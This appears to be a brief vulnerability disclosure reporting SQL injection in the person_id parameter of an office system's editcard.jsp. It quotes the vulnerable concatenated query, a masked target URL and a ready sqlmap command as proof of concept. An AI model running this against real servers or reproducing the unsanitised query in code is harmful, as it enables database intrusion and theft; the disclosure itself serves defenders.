# KASO-SQL


Impact Code

    <%}
    rs.close();
      sql = "select a.classid,a.name,b.popedom from oa_cardclass a,oa_card_popedom b where a.classid=b.classid and b.person_id='"+person_id+"'";  
      rs=DBmenu.executeQuery(sql); 
    %>


Injection：person_id

Injection url: http://xx.xx.xx.xx:8081/cardcase/editcard.jsp?person_id=2&id=1&classid=1


poc:
python .\sqlmap.py -u "http://xx.xx.xx.xx:8081/cardcase/editcard.jsp?person_id=2&id=1&classid=1" --random-agent --dbms=mssql

![Uploading image.png…]()

